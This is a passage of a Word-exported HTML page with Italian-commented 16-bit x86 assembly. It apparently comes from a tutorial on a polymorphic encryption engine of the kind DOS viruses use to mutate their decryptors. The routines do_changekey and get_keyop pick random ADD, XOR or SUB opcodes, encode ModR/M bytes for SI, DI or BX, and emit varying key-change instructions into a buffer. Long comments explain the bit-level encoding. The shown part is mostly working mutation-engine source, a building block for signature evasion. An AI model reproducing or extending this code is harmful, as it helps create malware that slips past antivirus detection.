color:#CCFFFF;mso-ansi-language:EN-US'>so_nothingelse:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>byte ptr
ds:[encrypt_loop],dh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ricapitoliamo:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; il valore di AX può variare tra 0/2/4. Ci sono quindi tre casi
a seconda del valore <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; di AX. Poniamo che il valore iniziale di AX sia 0. le
istruzioni<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; mov bx, offset mathadds<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; add bx,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; mov dx, word ptr ds:[bx]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; fanno sì che il contenuto di dx sia dh=29h, dl=01h (ricordiamo
che l’Intel memorizza <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; i dati al contrario). L’istruzione successiva<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; mov al,081h fa sì che il contenuto di AX sia:
ah=num.casuale,al=081h. lo stosb <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; successivo inserisce il valore di AL (opcode di add/xor/sub)
nel buffer. L’istruzione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; add dx,0003h fa sì che il contenuto di dx sia: dh=29h, dl=04h
(01h+3h).<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Presupponendo che si stia utilizzando una chiave fissa, lo
stosb successivo inserisce <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; AL nel buffer.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; quindi nel buffer finora abbiamo, con i due stosb:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes"> 
</span>1 byte<span style="mso-spacerun: yes">              </span>2 byte <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; 10000001<span style="mso-spacerun:
yes">             </span>00000100<span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes"> 
</span>opcode<span style="mso-spacerun: yes">            </span>byte modR/M <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ADD/XOR/SUB <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; e buona parte della codifica è fatta. Ora manca la codifica
del registro, che qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; risulta = 100. A questo ci pensa la routine register_corr.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; questo se AX = 0. Con le tre situazioni (AX=0,AX=2,AX=4)
risultano le seguenti <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; codifiche:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun:
yes">          </span>--opcode--<span style="mso-spacerun: yes">   </span>R/M-Mod-reg<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun:
yes">                 </span>s w<span style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; AX = 0 &gt; 100000 0 1<span style="mso-spacerun: yes">  
</span>00000<span style="mso-spacerun: yes">  </span>100<span
style="mso-spacerun: yes">   </span>quindi 81h /0 imm16, cioè ADD [reg], imm16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; AX = 2 &gt; 100000 0 1<span style="mso-spacerun: yes">  
</span>00110<span style="mso-spacerun: yes">  </span>100<span
style="mso-spacerun: yes">   </span>quindi 81h /6 imm16, cioè XOR [reg], imm16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; AX = 4 &gt; 100000 0 1<span style="mso-spacerun: yes">  
</span>00101<span style="mso-spacerun: yes">  </span>100<span
style="mso-spacerun: yes">   </span>quindi 81h /5 imm16, cioè SUB [reg], imm16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; il bit w = 1 perché word<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; il bit s = 0 perché unsigned (primo byte)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; notiano che il valore R/M è uguale a 00. Quindi non è usato
displacement, ma <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; semplicemente [reg]. Il 100 finale del byte ModR/M contiene il
registro, secondo lo <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; schema già visto:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>; valore R/M -
00<span style="mso-spacerun: yes">  </span>Mod:<span style="mso-spacerun:
yes">                 </span>­­­<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>000 - [BX+SI]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>001 - [BX+DI]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>010 - [BP+SI]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>011 - [BP+DI]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>100 - [SI]<span
style="mso-spacerun: yes">      </span>* registro buono<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes">              </span>101 - [DI]<span style="mso-spacerun: yes">     
</span>* registro buono<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>110 - d16<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<span
style="mso-spacerun: yes">                  </span>111 - [BX]<span
style="mso-spacerun: yes">      </span>* registro buono<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>; con “registro
buono” abbiamo indicato i registri che possiamo utilizzare.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; a quel 100 la routine register_corr, verificando il contenuto
di <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; byte ptr ds:[already_pnt], aggiungerà 0 ad AL se il contenuto
è = 6, quindi <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; l’istruzione risultante sarà: add [SI], imm16 / xor [SI],
imm16 / sub [SI], reg16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; oppure aggiungerà 1 ad AL (AL = 101) con il successivo INC, e
l’istruzione <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; risultante sarà:<span style="mso-spacerun: yes">  </span>add
[DI], imm16 / xor [SI], imm16 / sub [SI], reg16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; oppure aggiungerà 3 ad AL (AL = 111) con i successivi 2 INC, e
l’istruzione <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; risultante sarà:<span style="mso-spacerun: yes">  </span>add
[BX], imm16 / xor [BX], imm16 / sub [BX], reg16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Ora manca il contenuto di imm16. Questo viene ricavato, nel
caso della chiave fissa,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; con le due istruzioni:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; call<span style="mso-spacerun: yes">   
</span>sorta_random<span style="mso-spacerun: yes">       </span>; pesca un
numero casuale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">         </span>stosw<span
style="mso-spacerun: yes">              </span>; memorizza nel buffer.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; In conclusione, nel buffer alla fine della routine c’è una
delle seguenti istruzioni <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; codificate (abbiamo preso come numero casuale 44177):<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AL = 100<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=0<span style="mso-spacerun: yes">    </span>10000001
00000100 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè ADD
[SI], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=2<span style="mso-spacerun: yes">    </span>10000001
00110100 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè XOR
[SI], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=4<span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes"> </span>10000001 00101100 10101100 10010001<span
style="mso-spacerun: yes">  </span>cioè SUB [SI], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AL = 101<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=0<span style="mso-spacerun: yes">    </span>10000001
00000101 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè ADD
[DI], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=2<span style="mso-spacerun: yes">    </span>10000001
00110101 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè XOR
[DI], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=4<span style="mso-spacerun: yes">    </span>10000001
00101101 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè SUB
[DI], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AL = 111<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=0<span style="mso-spacerun: yes">    </span>10000001
00000111 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè ADD
[BX], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=2<span style="mso-spacerun: yes">    </span>10000001
00110111 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè XOR
[BX], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; se AX=4<span style="mso-spacerun: yes">    </span>10000001
00101111 10101100 10010001<span style="mso-spacerun: yes">  </span>cioè SUB
[BX], 44177<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; do_changekey scrive l'operazione di cambio della chiave.
Questa e' un<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ADD/SUB/XOR della chiave con un immediato di 16bit.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Se prima non e' stato scelto l'utilizzo di una chiave questa
procedura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; esce senza fare nulla.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>do_changekey:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>inc<span style="mso-spacerun: yes">     </span>byte ptr ds:[si]<span
style="mso-spacerun: yes">        </span>; SI = 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>cmp<span style="mso-spacerun: yes">     </span>byte ptr
ds:[already_key],0b0h<span style="mso-spacerun: yes">  </span>; c’è chiave
fissa ? se sì, esci<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jne<span style="mso-spacerun: yes">     </span>get_keyop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>get_keyop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>call<span style="mso-spacerun: yes">   
</span>sorta_random_07<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>cmp<span
style="mso-spacerun: yes">     </span>al,02<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>ja<span
style="mso-spacerun: yes">      </span>get_keyop<span style="mso-spacerun:
yes">      </span>; in AL casuale tra 0 e 2<span style="mso-spacerun: yes"> 
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>dh,0c1h<span
style="mso-spacerun: yes">        </span>; add<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>or<span style="mso-spacerun: yes">      </span>al,al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>jz<span
style="mso-spacerun: yes">      </span>ok_operoc<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>add<span style="mso-spacerun: yes">     </span>dh,28h<span
style="mso-spacerun: yes">          </span>; sub<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>je<span
style="mso-spacerun: yes">      </span>ok_operoc<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>add<span style="mso-spacerun: yes">     </span>dh,8<span
style="mso-spacerun: yes">            </span>; xor<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>ok_operoc:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>cmp<span style="mso-spacerun: yes">     </span>byte
ptr ds:[math_opdone],00h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>jne<span style="mso-spacerun: yes">    
</span>no_prez<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>inc<span
style="mso-spacerun: yes">     </span>byte ptr ds:[pre_kdn]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>no_prez:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>mov<span
style="mso-spacerun: yes">     </span>al,81h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>ah,dh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>mov<span style="mso-spacerun: yes">     </span>word
ptr ds:[modify_key],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>dec<span style="mso-spacerun: yes">     </span>ah<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>add<span style="mso-spacerun: yes">    
</span>ah,byte ptr ds:[already_key]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>stosw<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>and<span style="mso-spacerun: yes">    
</span>ah,011111000b<span style="mso-spacerun: yes">                   </span>;
Nell'encryptor e'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>or<span style="mso-spacerun: yes">     
</span>ah,000000001b<span style="mso-spacerun: yes">                   </span>;
tutto con CX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>word ptr ds:[pre_chk],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>call<span style="mso-spacerun: yes">   
</span>sorta_random<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>stosw<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>mov<span style="mso-spacerun: yes">     </span>word
ptr ds:[modify_key+2],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>mov<span style="mso-spacerun: yes">     </span>word
ptr ds:[pre_chk+2],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>no_changekey:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; inc_pnt crea l'istruzione per incrementare di uno il pointer
(INC reg16)<o:p></o:p></span></b></p>
